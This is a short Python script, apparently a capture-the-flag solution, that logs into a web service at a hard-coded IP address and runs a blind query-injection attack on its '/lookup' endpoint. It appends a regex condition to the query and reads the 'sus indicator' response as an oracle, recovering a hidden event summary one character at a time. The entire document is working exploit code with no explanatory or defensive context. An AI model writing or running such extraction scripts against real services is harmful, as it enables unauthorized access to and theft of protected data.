import requests
import string

s = requests.Session()
base_url = 'http://157.230.188.90'

r = s.post(f'{base_url}/login', {
    'username': 'a',
    'password': 'a'
})

summary = ''
alphabet =  [' ', '\\n'] + ['\\' + c for c in ',":=$()[]{}'] + list(string.ascii_letters + string.digits) + ['\\S', '\\s']

while True:

    for guess in alphabet:

        query = f'00000* | meta:event:summary ~= "^{summary + guess}" #'.ljust(128, 'a')

        r = s.post(f'{base_url}/lookup', {
            'query': query
        })
        assert('boi is safe' in r.text or 'sus indicator' in r.text)

        if 'sus indicator' in r.text:
            summary += guess
            print(summary)
            break
